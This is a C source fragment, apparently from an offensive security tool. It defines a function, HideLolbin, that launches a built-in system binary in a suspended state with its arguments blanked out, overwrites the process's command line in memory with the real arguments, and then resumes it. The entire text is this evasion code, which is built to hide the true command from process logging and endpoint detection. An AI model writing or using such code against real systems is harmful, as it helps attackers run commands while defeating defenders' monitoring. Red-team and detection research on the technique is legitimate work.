BOOL HideLolbin(const char* lolBinCommand) {
    BOOL status = FALSE;
    wchar_t *realCmdlineW = NULL;

    // Create spoofed cmdline
    char spoofedCmdline[MAX_PATH];
    ReplaceArgumentsWithSpaces(lolBinCommand, spoofedCmdline);

    // Convert realCmdline to wide character string
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, NULL, 0);
    realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    if (!realCmdlineW) {
        printf("Memory allocation failed\n");
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, realCmdlineW, realCmdlineLen);

    // Create suspended process
    PROCESS_INFORMATION pi;
    if (!CreateSuspendedProcess(spoofedCmdline, &pi)) {
        goto cleanup;
    }

    // Modify the process command line
    if (!ModifyProcessCommandLine(pi.hProcess, realCmdlineW)) {
        goto cleanup;
    }

    // Resume process
    ResumeThread(pi.hThread);
    status = TRUE;

cleanup:
    if (realCmdlineW) {
        free(realCmdlineW);
    }
    return status;
}
